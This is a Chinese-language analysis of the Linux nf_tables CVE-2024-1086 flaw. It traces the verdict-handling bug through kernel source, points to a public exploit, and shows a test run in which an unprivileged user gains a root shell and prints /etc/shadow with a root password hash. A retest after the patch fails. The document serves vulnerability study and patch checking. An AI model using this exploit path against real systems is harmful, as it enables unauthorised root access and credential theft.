# 漏洞分析
在`nft_verdict_init()`流程中, 允许用户设置`[NF_DROP(0), NF_MAX_VERDICT(5)]`之外的verdict值。

```cpp
static int nft_verdict_init(const struct nft_ctx *ctx, struct nft_data *data,
                            struct nft_data_desc *desc, const struct nlattr *nla)
{
        switch (data->verdict.code) {
        default:
                //获取最后一个字节
                switch (data->verdict.code & NF_VERDICT_MASK) {
                case NF_ACCEPT:
                case NF_DROP:
                case NF_QUEUE:
                        break;
                default:
                        return -EINVAL;
                }
                /* fall through */
 
```

但是在`nf_hook_slow()`中有下面一段逻辑
```cpp
int nf_hook_slow(struct sk_buff *skb, struct nf_hook_state *state,
                 const struct nf_hook_entries *e, unsigned int s)
{
        unsigned int verdict;
        int ret;

        for (; s < e->num_hook_entries; s++) {
                verdict = nf_hook_entry_hookfn(&e->hooks[s], skb, state);
                switch (verdict & NF_VERDICT_MASK) {
                case NF_ACCEPT:
                        break;
                case NF_DROP:
                        kfree_skb(skb);
                        ret = NF_DROP_GETERR(verdict);
                        if (ret == 0)
                                ret = -EPERM;
                        return ret;
        
}
```
如果 `verdict & NF_VERDICT_MASK == NR_DROP`, 则认为该数据包需要丢弃，
所以这里会执行`kfree_skb()`

而`NF_DROP_GETERR`中会获取verdict高16bit的数据的负数，作为ERR CODE返回。
```cpp
#define NF_VERDICT_QBITS 16

static inline int NF_DROP_GETERR(int verdict)
{
        return -(verdict >> NF_VERDICT_QBITS);
}
```

但是这里就有一个问题，由于`nft_verdict_init()`允许用户设置高位[31, 8], 所以
可以将[31, 16] 设置为负数。 这样 `NF_DROP_GETERR`就可以返回正数。

而正数 1 是有特殊含义的，需要caller调用 `okfn()` 去处理， 而最终得到正数1,
同时需要满足`verdict & NF_VERDICT_MASK == NF_DROP(0)`, 需要设置的 verdict 的
值为`0xffff0000`

`nf_hook_slow`注释中有说明, 如下:
```
/* Returns 1 if okfn() needs to be executed by the caller,
 * -EPERM for NF_DROP, 0 otherwise.  Caller must hold rcu_read_lock. */
```
我们以一个调用堆栈为例
```
NF_HOOK
  nf_hook
    nf_hook_slow
```

```cpp
static inline int
NF_HOOK(uint8_t pf, unsigned int hook, struct net *net, struct sock *sk, struct sk_buff *skb,
        struct net_device *in, struct net_device *out,
        int (*okfn)(struct net *, struct sock *, struct sk_buff *))
{
        int ret = nf_hook(pf, hook, net, sk, skb, in, out, okfn);
        if (ret == 1)   //返回1, 需要调用 okfn, 这时，会将skb作为参数传入
                ret = okfn(net, sk, skb);
        return ret;
}
```

以 ip_rcv caller为例:

```cpp
int ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev)
{
        ...
        return NF_HOOK(NFPROTO_IPV4, NF_INET_PRE_ROUTING,
                               net, NULL, skb, dev, NULL,
                               ip_rcv_finish);
        ...
}
static int ip_rcv_finish(struct net *net, struct sock *sk, struct sk_buff *skb)
{
        const struct iphdr *iph = ip_hdr(skb);
        int (*edemux)(struct sk_buff *skb);
        struct net_device *dev = skb->dev;
        ...
}
```

简单展开`ip_rcv_finish`可以发现该函数会访问skb数据结构，造成use-after-free

# 测试

测试用例来自:

https://github.com/Notselwyn/CVE-2024-1086.git


该代码原理比较复杂，我们只看设置 verdict 的部分:
```cpp
static struct nftnl_rule *alloc_rule(unsigned char family, const char *table, const char *chain, unsigned char proto)
{
        ...
        // (NF_DROP | -((0xFFFF << 16) >> 16)) == 1, aka NF_ACCEPT (trigger double free)
        // (NF_DROP | -((0xFFF0 << 16) >> 16)) == 16
        add_set_verdict(r, (unsigned int)(0xFFFF0000));

        return r;
}
```

可以看到将verdict设置为`0xFFFF0000`

## 4.18.0-372 测试

在4.18.0-372 kernel 上编译测试

```
[root@localhost ~]# uname -r
4.18.0-372.19.1.es8_9.x86_64
[root@localhost ~]# su wang
[wang@localhost root]$ cd ~
[wang@localhost ~]$ cat /etc/shadow					//普通用户无权限访问
cat: /etc/shadow: Permission denied
[wang@localhost ~]$  CVE-2024-1086/exploit			//执行恶意程序
[*] creating user namespace (CLONE_NEWUSER)...
[*] creating network namespace (CLONE_NEWNET)...
[*] setting up UID namespace...
[*] configuring localhost in namespace...
[*] setting up nftables...
[+] running normal privesc
[*] waiting for the calm before the storm...
[*] sending double free buffer packet...
[*] spraying 16000 pte's...
[*] checking 16000 sprayed pte's for overlap...
[+] confirmed double alloc PMD/PTE
[+] found possible physical kernel base: 000000001e800000
[-] failed to find correct modprobe_path: trying to find new kernel base...
[+] found possible physical kernel base: 000000001ee00000
[-] failed to find correct modprobe_path: trying to find new kernel base...
[+] found possible physical kernel base: 0000000030600000
[-] failed to find correct modprobe_path: trying to find new kernel base...
[+] found possible physical kernel base: 000000007b200000
[-] ^false positive. skipping to next one

[-] failed to find correct modprobe_path: trying to find new kernel base...
[+] found possible physical kernel base: 00000001fc000000
[+] verified modprobe_path/usermodehelper_path: 00000001fd65cbc0 ('/sanitycheck')...
[*] overwriting path with PIDs in range 0->4194304...
sh: cannot set terminal process group (-1): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4#													//转换为root用户
sh-4.4# cat cat /etc/shadow |head						//可以访问 /etc/shadow
cat: cat: No such file or directory
root:$6$.AFQAabsX7WKDIgu$t0Cak1Sm6wqo1mu3E4ORMjKu2hOLGIQp08UghrV3xuBJNNjeXV1go6cFS8scOk1ABbItaL7BE6I5TCuiKNUtr1:19098:0:99999:7:::
bin:*:18397:0:99999:7:::
daemon:*:18397:0:99999:7:::
adm:*:18397:0:99999:7:::
lp:*:18397:0:99999:7:::
sync:*:18397:0:99999:7:::
shutdown:*:18397:0:99999:7:::
halt:*:18397:0:99999:7:::
mail:*:18397:0:99999:7:::
operator:*:18397:0:99999:7:::
```

同时 串口有以下warnning
```
localhost login: [   41.330822] WARNING: CPU: 0 PID: 963 at mm/slub.c:3455 free_nonslab_page+0x70/0x90
[   41.332508] Modules linked in: nf_tables nfnetlink intel_rapl_msr intel_rapl_common sb_edac kvm_intel kvm irqbypass crct10dif_r
[   41.337782] CPU: 0 PID: 963 Comm: exploit Not tainted 4.18.0-372.19.1.es8_9.x86_64 #1
[   41.339159] Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.16.2-1.fc38 04/01/2014
[   41.340555] RIP: 0010:free_nonslab_page+0x70/0x90
[   41.341463] Code: be 06 00 00 00 48 89 df e8 cd f5 01 00 48 89 ef 57 9d 0f 1f 44 00 00 48 83 c4 08 44 89 e6 48 89 df 5b 5d 41 5
[   41.344644] RSP: 0018:ffff9f4500003c08 EFLAGS: 00010246
[   41.345513] RAX: dead000000000100 RBX: ffffc49544183c00 RCX: 0000000000000000
[   41.346674] RDX: 00000000fffff000 RSI: ffff8b64c60f0000 RDI: ffffc49544183c00
[   41.347829] RBP: ffffc49544183c00 R08: 0000000000000000 R09: 0000000000000001
[   41.348983] R10: ffff8b64c60e8a00 R11: 0000000000000470 R12: 0000000000000000
[   41.350158] R13: 0000000000000000 R14: ffff8b64c60bb170 R15: ffff8b64c554c180
[   41.351329] FS:  000000000226d380(0000) GS:ffff8b6637c00000(0000) knlGS:0000000000000000
[   41.352653] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   41.353605] CR2: 00000107cfe00000 CR3: 0000000105c4c003 CR4: 0000000000170ef0
[   41.354789] Call Trace:
[   41.355216]  <IRQ>
[   41.355554]  ? kfree_skb+0x32/0xa0
[   41.356235]  kfree+0x19c/0x1f0
[   41.356753]  ? inet_frag_rbtree_purge+0x47/0x70
[   41.357529]  kfree_skb+0x32/0xa0
[   41.358072]  inet_frag_rbtree_purge+0x47/0x70
[   41.358907]  inet_frag_destroy+0x8a/0xb0
[   41.359659]  ip_defrag+0x4e4/0x830
[   41.360290]  ? update_load_avg+0x7e/0x700
[   41.360954]  ip_local_deliver+0x4d/0xf0
[   41.361599]  ? nf_hook_slow+0x44/0xc0
[   41.362215]  ip_rcv+0x27b/0x36f
[   41.362743]  ? inet_add_protocol.cold.1+0x1e/0x1e
[   41.363532]  __netif_receive_skb_core+0xba0/0xcb0
[   41.364310]  ? update_curr+0xe1/0x1c0
[   41.364921]  process_backlog+0xaa/0x160
[   41.365569]  __napi_poll+0x2d/0x130
[   41.366148]  net_rx_action+0x253/0x320
[   41.366782]  ? ktime_get+0x3e/0xa0
[   41.367635]  __do_softirq+0xd7/0x2c4
[   41.368235]  do_softirq_own_stack+0x2a/0x40
```
应该是double free的场景。

在该版本kernel module上合入patch, 然后再进行测试:
```
[root@localhost netfilter]# modinfo nf_tables |grep dep
depends:        nfnetlink,libcrc32c
[root@localhost netfilter]# modprobe nfnetlink
[root@localhost netfilter]# insmod nf_tables.ko
[root@localhost netfilter]# su wang
[wang@localhost netfilter]$ cd ~
[wang@localhost ~]$ ~/CVE-2024-1086/exploit
[*] creating user namespace (CLONE_NEWUSER)...
[*] creating network namespace (CLONE_NEWNET)...
[*] setting up UID namespace...
[*] configuring localhost in namespace...
[*] setting up nftables...
[+] running normal privesc
[*] waiting for the calm before the storm...
[*] sending double free buffer packet...
[*] spraying 16000 pte's...
[*] checking 16000 sprayed pte's for overlap...
[-] failed to detect overwritten pte: is more PTE spray needed? pmd: 00000000cafebabe
```

可以看到，该测试程序会失败，同时串口中也没有异常打印.
